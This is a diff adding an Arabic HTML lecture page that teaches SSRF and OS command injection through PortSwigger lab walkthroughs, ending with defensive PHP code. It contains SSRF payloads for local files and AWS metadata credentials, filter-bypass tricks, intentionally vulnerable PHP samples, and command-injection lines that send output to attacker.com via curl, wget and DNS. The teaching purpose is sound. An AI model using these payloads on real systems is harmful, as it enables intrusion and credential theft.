@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محاضرة SSRF + Command Injection - ساعتان</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            padding: 30px 0;
+            text-align: center;
+            margin-bottom: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .header h1 {
+            color: #ffffff;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .header p {
+            color: #b8d4f0;
+            font-size: 1.2em;
+        }
+
+        .nav-menu {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            position: sticky;
+            top: 10px;
+            z-index: 100;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        .nav-menu ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .nav-menu a {
+            color: #64b5f6;
+            text-decoration: none;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            font-weight: 400;
+            font-size: 0.75em;
+            white-space: nowrap;
+        }
+
+        .nav-menu a:hover {
+            background: #64b5f6;
+            color: #1a1a1a;
+            transform: translateY(-1px);
+        }
+
+        .content-section {
+            background: rgba(30, 30, 30, 0.8);
+            backdrop-filter: blur(10px);
+            margin-bottom: 30px;
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 4px;
+            background: linear-gradient(90deg, #64b5f6, #81c784);
+            z-index: 1000;
+            transition: width 0.3s ease;
+        }
+
+        .section-title {
+            color: #64b5f6;
+            font-size: 2em;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 2px solid #64b5f6;
+            padding-bottom: 10px;
+        }
+
+        .section-title i {
+            color: #81c784;
+        }
+
+        .subsection-title {
+            color: #81c784;
+            font-size: 1.5em;
+            margin: 25px 0 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .highlight-box {
+            background: rgba(100, 181, 246, 0.1);
+            border: 1px solid rgba(100, 181, 246, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .highlight-box.danger {
+            background: rgba(244, 67, 54, 0.1);
+            border-color: rgba(244, 67, 54, 0.3);
+        }
+
+        .highlight-box.success {
+            background: rgba(76, 175, 80, 0.1);
+            border-color: rgba(76, 175, 80, 0.3);
+        }
+
+        .highlight-box.warning {
+            background: rgba(255, 152, 0, 0.1);
+            border-color: rgba(255, 152, 0, 0.3);
+        }
+
+        .code-block {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .code-header {
+            background: #2d2d2d;
+            padding: 8px 15px;
+            margin: -20px -20px 15px -20px;
+            border-radius: 8px 8px 0 0;
+            font-size: 0.9em;
+            color: #81c784;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .lab-card {
+            background: linear-gradient(135deg, rgba(129, 199, 132, 0.1) 0%, rgba(100, 181, 246, 0.1) 100%);
+            border: 1px solid rgba(129, 199, 132, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+
+        .lab-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(129, 199, 132, 0.2);
+        }
+
+        .lab-title {
+            color: #81c784;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .lab-url {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #64b5f6;
+            margin-bottom: 15px;
+            word-break: break-all;
+        }
+
+        .step-list {
+            counter-reset: step-counter;
+            list-style: none;
+            padding: 0;
+        }
+
+        .step-list li {
+            counter-increment: step-counter;
+            background: rgba(0, 0, 0, 0.2);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #64b5f6;
+            position: relative;
+        }
+
+        .step-list li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: -15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #64b5f6;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .tip-box {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .tip-box::before {
+            content: '\f0eb';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: #ffc107;
+            font-size: 1.2em;
+        }
+
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .flow-step {
+            background: rgba(100, 181, 246, 0.2);
+            padding: 10px 15px;
+            border-radius: 20px;
+            border: 1px solid rgba(100, 181, 246, 0.3);
+            font-size: 0.9em;
+            text-align: center;
+            min-width: 120px;
+        }
+
+        .flow-arrow {
+            color: #81c784;
+            font-size: 1.5em;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .section-title {
+                font-size: 1.5em;
+            }
+            
+            .attack-flow {
+                flex-direction: column;
+            }
+            
+            .flow-arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="progress-bar" id="progressBar"></div>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1><i class="fas fa-server"></i> SSRF + Command Injection</h1>
+            <p>محاضرة شاملة عن هجمات الخادم من جانب الخادم وحقن الأوامر - ساعتان</p>
+        </div>
+
+        <!-- Navigation Menu -->
+        <div class="nav-menu">
+            <ul>
+                <li><a href="#introduction">مقدمة</a></li>
+                <li><a href="#ssrf-basics">أساسيات SSRF</a></li>
+                <li><a href="#ssrf-types">أنواع SSRF</a></li>
+                <li><a href="#ssrf-labs">مختبرات SSRF</a></li>
+                <li><a href="#command-injection-basics">أساسيات Command Injection</a></li>
+                <li><a href="#command-types">أنواع Command Injection</a></li>
+                <li><a href="#command-labs">مختبرات Command Injection</a></li>
+                <li><a href="#prevention">طرق الحماية</a></li>
+                <li><a href="#conclusion">خاتمة</a></li>
+            </ul>
+        </div>
+
+        <!-- Introduction Section -->
+        <div class="content-section" id="introduction">
+            <h2 class="section-title">
+                <i class="fas fa-info-circle"></i>
+                مقدمة عن الهجمات من جانب الخادم
+            </h2>
+            
+            <p>مرحباً بكم في المحاضرة الثانية من سلسلة أمان تطبيقات الويب. في هذه المحاضرة، سنتعلم عن نوعين خطيرين من الهجمات:</p>
+            
+            <div class="highlight-box">
+                <h3><i class="fas fa-globe"></i> Server-Side Request Forgery (SSRF)</h3>
+                <p>هجوم يسمح للمهاجم بإرسال طلبات HTTP من الخادم إلى موارد داخلية أو خارجية غير مصرح بها.</p>
+            </div>
+
+            <div class="highlight-box">
+                <h3><i class="fas fa-terminal"></i> Command Injection</h3>
+                <p>هجوم يمكن المهاجم من تنفيذ أوامر نظام التشغيل على الخادم من خلال التطبيق.</p>
+            </div>
+
+            <div class="attack-flow">
+                <div class="flow-step">تحديد نقطة الدخول</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">اختبار الPayloads</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">تجاوز الفلاتر</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">استغلال الثغرة</div>
+            </div>
+        </div>
+
+        <!-- SSRF Basics Section -->
+        <div class="content-section" id="ssrf-basics">
+            <h2 class="section-title">
+                <i class="fas fa-globe"></i>
+                أساسيات Server-Side Request Forgery (SSRF)
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-question-circle"></i>
+                ما هو SSRF؟
+            </h3>
+            
+            <p>SSRF هو ثغرة أمنية تحدث عندما يستطيع المهاجم إجبار التطبيق على إرسال طلبات HTTP إلى مواقع غير مقصودة، مما يمكنه من:</p>
+            
+            <ul style="margin: 20px 0; padding-right: 30px;">
+                <li>الوصول للخوادم الداخلية</li>
+                <li>قراءة ملفات النظام</li>
+                <li>الوصول لخدمات السحابة (AWS, Azure, GCP)</li>
+                <li>مسح الشبكة الداخلية</li>
+            </ul>
+
+            <div class="highlight-box danger">
+                <h4><i class="fas fa-exclamation-triangle"></i> خطورة SSRF</h4>
+                <p>SSRF يمكن أن يؤدي إلى تسريب بيانات حساسة، الوصول لخدمات داخلية، أو حتى Remote Code Execution في بعض الحالات.</p>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-cogs"></i>
+                كيف يعمل SSRF؟
+            </h3>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-code"></i>
+                    مثال على كود معرض لـ SSRF (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+// كود معرض لـ SSRF
+$url = $_GET['url'];
+$response = file_get_contents($url);
+echo $response;
+?&gt;</code></pre>
+            </div>
+
+            <div class="tip-box">
+                <strong>نصيحة:</strong> ابحث دائماً عن المعاملات التي تقبل URLs مثل: url, target, redirect, callback, webhook
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-terminal"></i>
+                    أمثلة على Payloads أساسية
+                </div>
+                <pre><code># الوصول للملفات المحلية
+file:///etc/passwd
+file:///c:/windows/system32/drivers/etc/hosts
+
+# الوصول للشبكة الداخلية
+http://192.168.1.1/
+http://10.0.0.1/admin
+http://localhost:8080/status
+
+# الوصول لـ AWS Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+            </div>
+        </div>
+
+        <!-- SSRF Types Section -->
+        <div class="content-section" id="ssrf-types">
+            <h2 class="section-title">
+                <i class="fas fa-list"></i>
+                أنواع SSRF
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-eye"></i>
+                Regular SSRF
+            </h3>
+            
+            <p>النوع الأساسي من SSRF حيث يمكن للمهاجم رؤية استجابة الطلب مباشرة:</p>
+            
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-globe"></i>
+                    مثال على Regular SSRF
+                </div>
+                <pre><code>GET /fetch?url=http://internal-server/admin HTTP/1.1
+Host: vulnerable-app.com
+
+Response: &lt;html&gt;&lt;title&gt;Admin Panel&lt;/title&gt;...&lt;/html&gt;</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-eye-slash"></i>
+                Blind SSRF
+            </h3>
+            
+            <p>النوع المتقدم من SSRF حيث لا يمكن للمهاجم رؤية الاستجابة، لكن يمكن اكتشافه من خلال:</p>
+            
+            <ul style="margin: 20px 0; padding-right: 30px;">
+                <li>وقت الاستجابة (Time-based)</li>
+                <li>DNS Lookups</li>
+                <li>Out-of-band techniques</li>
+            </ul>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-clock"></i>
+                    اكتشاف Blind SSRF بواسطة Time-based
+                </div>
+                <pre><code># إذا كان المنفذ مفتوح - استجابة سريعة
+http://192.168.1.1:80/
+
+# إذا كان المنفذ مغلق - استجابة بطيئة (timeout)
+http://192.168.1.1:12345/</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-cloud"></i>
+                Cloud Metadata SSRF
+            </h3>
+            
+            <p>استغلال خاص بالخوادم السحابية للوصول لمعلومات حساسة:</p>
+            
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fab fa-aws"></i>
+                    AWS Instance Metadata
+                </div>
+                <pre><code># الحصول على IAM Credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
+
+# معلومات أخرى مفيدة
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/user-data</code></pre>
+            </div>
+
+            <div class="highlight-box warning">
+                <h4><i class="fas fa-shield-alt"></i> IMDSv2 Protection</h4>
+                <p>AWS قدمت IMDSv2 كحماية إضافية تتطلب HTTP Header خاص. يمكن تجاوزها أحياناً باستخدام HTTP redirects.</p>
+            </div>
+        </div>
+
+        <!-- SSRF Labs Section -->
+        <div class="content-section" id="ssrf-labs">
+            <h2 class="section-title">
+                <i class="fas fa-flask"></i>
+                مختبرات SSRF العملية
+            </h2>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الأول: Basic SSRF against the local server
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
+                </div>
+                <p><strong>الهدف:</strong> استخدام SSRF للوصول لصفحة Admin المحلية وحذف مستخدم.</p>
+                
+                <ol class="step-list">
+                    <li>افتح المختبر وانتقل لصفحة أي منتج</li>
+                    <li>اضغط على "Check stock" واعترض الطلب بـ Burp Suite</li>
+                    <li>غيّر قيمة المعامل stockApi إلى: <code>http://localhost/admin</code></li>
+                    <li>ستحصل على صفحة Admin Panel</li>
+                    <li>استخدم الرابط المعطى لحذف المستخدم carlos</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثاني: Basic SSRF against another back-end system
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
+                </div>
+                <p><strong>الهدف:</strong> مسح الشبكة الداخلية واكتشاف admin interface على منفذ 8080.</p>
+                
+                <ol class="step-list">
+                    <li>اعترض طلب "Check stock" مرة أخرى</li>
+                    <li>استخدم Burp Intruder لمسح الشبكة الداخلية</li>
+                    <li>اضبط stockApi على: <code>http://192.168.0.§1§:8080/admin</code></li>
+                    <li>اضبط payload من 1 إلى 255</li>
+                    <li>ابحث عن الاستجابة بطول مختلف (200 OK)</li>
+                    <li>استخدم العنوان المكتشف لحذف المستخدم</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثالث: SSRF with blacklist-based input filter
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
+                </div>
+                <p><strong>الهدف:</strong> تجاوز الفلاتر للوصول لـ localhost admin.</p>
+                
+                <div class="tip-box">
+                    <strong>تقنيات التجاوز:</strong>
+                    <ul style="margin-top: 10px;">
+                        <li>استخدام 127.1 بدلاً من 127.0.0.1</li>
+                        <li>Double URL encoding</li>
+                        <li>استخدام كلمات بديلة مثل ADMIN بدلاً من admin</li>
+                    </ul>
+                </div>
+
+                <ol class="step-list">
+                    <li>جرب الpayload: <code>http://127.1/ADMIN</code></li>
+                    <li>إذا لم يعمل، جرب double encoding: <code>http://127.1/%2561dmin</code></li>
+                    <li>استخدم الطريقة الناجحة لحذف المستخدم</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Command Injection Basics Section -->
+        <div class="content-section" id="command-injection-basics">
+            <h2 class="section-title">
+                <i class="fas fa-terminal"></i>
+                أساسيات Command Injection
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-question-circle"></i>
+                ما هو Command Injection؟
+            </h3>
+            
+            <p>Command Injection هو ثغرة أمنية تسمح للمهاجم بتنفيذ أوامر نظام التشغيل على الخادم. تحدث هذه الثغرة عندما يقوم التطبيق بتمرير بيانات المستخدم إلى shell command دون التحقق منها.</p>
+
+            <div class="highlight-box danger">
+                <h4><i class="fas fa-skull-crossbones"></i> خطورة Command Injection</h4>
+                <p>هذه الثغرة خطيرة جداً لأنها تمكن المهاجم من:</p>
+                <ul style="margin-top: 10px;">
+                    <li>قراءة وتعديل الملفات الحساسة</li>
+                    <li>تنفيذ أوامر الإدارة</li>
+                    <li>تنصيب backdoors</li>
+                    <li>السيطرة الكاملة على الخادم</li>
+                </ul>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-cogs"></i>
+                كيف يعمل Command Injection؟
+            </h3>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-code"></i>
+                    مثال على كود معرض لـ Command Injection (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+$target = $_POST['ip'];
+$output = shell_exec("ping -c 4 " . $target);
+echo $output;
+?&gt;</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-terminal"></i>
+                    استغلال الكود السابق
+                </div>
+                <pre><code># Payload عادي
+8.8.8.8; id
+
+# النتيجة المنفذة على الخادم
+ping -c 4 8.8.8.8; id
+
+# يمكن أيضاً استخدام
+8.8.8.8 && whoami
+8.8.8.8 | cat /etc/passwd
+8.8.8.8 `whoami`</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-list"></i>
+                Command Separators المفيدة
+            </h3>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-tools"></i>
+                    رموز فصل الأوامر في أنظمة التشغيل المختلفة
+                </div>
+                <pre><code># Unix/Linux
+;    # تنفيذ الأمر التالي دائماً
+&&   # تنفيذ الأمر التالي إذا نجح الأول
+||   # تنفيذ الأمر التالي إذا فشل الأول
+|    # تمرير output الأمر الأول للأمر الثاني
+`    # Command substitution
+$()  # Command substitution (bash)
+
+# Windows
+&    # تنفيذ الأمر التالي دائماً
+&&   # تنفيذ الأمر التالي إذا نجح الأول
+||   # تنفيذ الأمر التالي إذا فشل الأول
+|    # Pipe</code></pre>
+            </div>
+        </div>
+
+        <!-- Command Types Section -->
+        <div class="content-section" id="command-types">
+            <h2 class="section-title">
+                <i class="fas fa-code-branch"></i>
+                أنواع Command Injection
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-eye"></i>
+                In-band Command Injection
+            </h3>
+            
+            <p>النوع الأساسي حيث يظهر output الأمر مباشرة في استجابة التطبيق:</p>
+            
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-terminal"></i>
+                    مثال على In-band Command Injection
+                </div>
+                <pre><code># الطلب
+POST /ping.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+ip=8.8.8.8; cat /etc/passwd
+
+# الاستجابة
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-eye-slash"></i>
+                Blind Command Injection
+            </h3>
+            
+            <p>النوع المتقدم حيث لا يظهر output مباشرة. يمكن اكتشافه بطرق مختلفة:</p>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-clock"></i>
+                    Time-based Detection
+                </div>
+                <pre><code># Linux/Unix
+8.8.8.8; sleep 10
+8.8.8.8 && ping -c 10 127.0.0.1
+
+# Windows
+8.8.8.8 & timeout 10
+8.8.8.8 && ping -n 10 127.0.0.1</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-globe"></i>
+                    Out-of-band Detection
+                </div>
+                <pre><code># إرسال DNS request
+8.8.8.8; nslookup `whoami`.attacker.com
+8.8.8.8; dig `id`.attacker.com
+
+# إرسال HTTP request
+8.8.8.8; curl http://attacker.com/`whoami`
+8.8.8.8; wget http://attacker.com/exfil/`id`</code></pre>
+            </div>
+        </div>
+
+        <!-- Command Labs Section -->
+        <div class="content-section" id="command-labs">
+            <h2 class="section-title">
+                <i class="fas fa-flask"></i>
+                مختبرات Command Injection العملية
+            </h2>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الأول: OS command injection, simple case
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/os-command-injection/lab-simple
+                </div>
+                <p><strong>الهدف:</strong> تنفيذ الأمر whoami باستخدام Command Injection.</p>
+                
+                <ol class="step-list">
+                    <li>افتح المختبر وانتقل لصفحة أي منتج</li>
+                    <li>اضغط على "Check stock" واعترض الطلب</li>
+                    <li>أضف payload للمعامل productId أو storeId: <code>1; whoami</code></li>
+                    <li>أرسل الطلب وشاهد النتيجة</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثاني: Blind OS command injection with time delays
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
+                </div>
+                <p><strong>الهدف:</strong> استخدام time delay لإثبات وجود blind command injection.</p>
+                
+                <ol class="step-list">
+                    <li>ابحث عن نموذج feedback أو contact</li>
+                    <li>اعترض الطلب وأضف payload مع sleep: <code>test@test.com & sleep 10 &</code></li>
+                    <li>قم بالتوقيت - إذا تأخرت الاستجابة 10 ثوان، فهناك ثغرة</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثالث: Blind OS command injection with output redirection
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
+                </div>
+                <p><strong>الهدف:</strong> استخدام output redirection لرؤية نتائج الأوامر.</p>
+                
+                <ol class="step-list">
+                    <li>اعترض طلب feedback مرة أخرى</li>
+                    <li>استخدم payload: <code>test@test.com & whoami > /var/www/static/whoami.txt &</code></li>
+                    <li>انتقل إلى: <code>https://lab-url/whoami.txt</code></li>
+                    <li>ستجد نتيجة الأمر whoami</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Prevention Section -->
+        <div class="content-section" id="prevention">
+            <h2 class="section-title">
+                <i class="fas fa-shield-alt"></i>
+                طرق الحماية والدفاع
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-lock"></i>
+                الحماية من SSRF
+            </h3>
+
+            <div class="highlight-box success">
+                <h4><i class="fas fa-check-circle"></i> أفضل الممارسات للحماية من SSRF</h4>
+                <ul style="margin-top: 15px;">
+                    <li><strong>Whitelist المجالات المسموحة:</strong> اسمح فقط بالمجالات المطلوبة</li>
+                    <li><strong>حظر Private IPs:</strong> امنع الوصول للشبكات الداخلية</li>
+                    <li><strong>استخدام DNS resolution:</strong> تحقق من عناوين IP بعد DNS lookup</li>
+                    <li><strong>Network Segmentation:</strong> فصل الخوادم الحساسة عن الشبكة الخارجية</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-code"></i>
+                    مثال على كود آمن (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+function isValidURL($url) {
+    // التحقق من البروتوكول
+    if (!preg_match('/^https?:\/\//', $url)) {
+        return false;
+    }
+    
+    // الحصول على معلومات الURL
+    $parsed = parse_url($url);
+    if (!$parsed || !isset($parsed['host'])) {
+        return false;
+    }
+    
+    // حظر Private IPs
+    $ip = gethostbyname($parsed['host']);
+    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+        return false;
+    }
+    
+    // Whitelist المجالات المسموحة
+    $allowedDomains = ['api.example.com', 'trusted.com'];
+    if (!in_array($parsed['host'], $allowedDomains)) {
+        return false;
+    }
+    
+    return true;
+}
+
+$url = $_GET['url'];
+if (isValidURL($url)) {
+    $response = file_get_contents($url);
+    echo $response;
+} else {
+    echo "URL غير مسموح";
+}
+?&gt;</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-terminal"></i>
+                الحماية من Command Injection
+            </h3>
+
+            <div class="highlight-box success">
+                <h4><i class="fas fa-check-circle"></i> أفضل الممارسات للحماية من Command Injection</h4>
+                <ul style="margin-top: 15px;">
+                    <li><strong>تجنب shell_exec:</strong> استخدم APIs مخصصة بدلاً من system calls</li>
+                    <li><strong>Input Validation:</strong> تحقق من صحة المدخلات وقم بfiltring</li>
+                    <li><strong>Parameterized Commands:</strong> استخدم معاملات آمنة بدلاً من string concatenation</li>
+                    <li><strong>Principle of Least Privilege:</strong> قلل صلاحيات المستخدم المنفذ للتطبيق</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-code"></i>
+                    مثال على كود آمن (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+function safePing($target) {
+    // التحقق من صيغة IP address
+    if (!filter_var($target, FILTER_VALIDATE_IP)) {
+        return "IP address غير صحيح";
+    }
+    
+    // استخدام escapeshellarg لحماية المعامل
+    $safeTarget = escapeshellarg($target);
+    $output = shell_exec("ping -c 4 $safeTarget 2>&1");
+    
+    return $output;
+}
+
+// أفضل: استخدام مكتبة مخصصة
+function betterPing($target) {
+    if (!filter_var($target, FILTER_VALIDATE_IP)) {
+        return "IP address غير صحيح";
+    }
+    
+    // استخدام exec مع array للمعاملات
+    $output = [];
+    $returnCode = 0;
+    exec("ping -c 4 " . escapeshellarg($target), $output, $returnCode);
+    
+    return implode("\n", $output);
+}
+?&gt;</code></pre>
+            </div>
+        </div>
+
+        <!-- Conclusion Section -->
+        <div class="content-section" id="conclusion">
+            <h2 class="section-title">
+                <i class="fas fa-graduation-cap"></i>
+                خاتمة المحاضرة
+            </h2>
+
+            <div class="highlight-box">
+                <h3><i class="fas fa-lightbulb"></i> ملخص ما تعلمناه</h3>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h4 style="color: #64b5f6; margin-bottom: 10px;">SSRF</h4>
+                        <ul>
+                            <li>أساسيات SSRF وطرق عمله</li>
+                            <li>أنواع SSRF (Regular, Blind, Cloud Metadata)</li>
+                            <li>تقنيات تجاوز الفلاتر</li>
+                            <li>مختبرات عملية من PortSwigger</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4 style="color: #64b5f6; margin-bottom: 10px;">Command Injection</h4>
+                        <ul>
+                            <li>أساسيات Command Injection</li>
+                            <li>أنواع الاستغلال (In-band, Blind)</li>
+                            <li>تقنيات الاكتشاف المختلفة</li>
+                            <li>مختبرات عملية شاملة</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="highlight-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i> نصائح مهمة للمتقدمين</h4>
+                <ul style="margin-top: 15px;">
+                    <li><strong>اختبر دائماً بطرق متعددة:</strong> لا تعتمد على تقنية واحدة فقط</li>
+                    <li><strong>راقب الاستجابات:</strong> الوقت، الطول، الأخطاء - كلها مؤشرات مهمة</li>
+                    <li><strong>استخدم أدوات متنوعة:</strong> Burp Suite, OWASP ZAP, وأدوات مخصصة</li>
+                    <li><strong>وثق اكتشافاتك:</strong> سجل الPayloads الناجحة للاستخدام المستقبلي</li>
+                </ul>
+            </div>
+
+            <div class="attack-flow" style="margin: 30px 0;">
+                <div class="flow-step">الممارسة المستمرة</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">تطوير المهارات</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">الاحتراف</div>
+            </div>
+
+            <div style="text-align: center; margin-top: 40px; padding: 30px; background: rgba(100, 181, 246, 0.1); border-radius: 15px;">
+                <h3 style="color: #64b5f6; margin-bottom: 15px;">
+                    <i class="fas fa-heart"></i>
+                    شكراً لمتابعتكم
+                </h3>
+                <p style="font-size: 1.1em; margin-bottom: 20px;">
+                    أتمنى أن تكون هذه المحاضرة مفيدة في رحلتكم لتعلم أمان تطبيقات الويب
+                </p>
+                <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
+                    <a href="../index.html" style="color: #64b5f6; text-decoration: none; padding: 10px 20px; border: 1px solid #64b5f6; border-radius: 25px; transition: all 0.3s ease;">
+                        <i class="fas fa-home"></i> العودة للصفحة الرئيسية
+                    </a>
+                    <a href="https://github.com/abode1234/lecture-server-side-attack" target="_blank" style="color: #81c784; text-decoration: none; padding: 10px 20px; border: 1px solid #81c784; border-radius: 25px; transition: all 0.3s ease;">
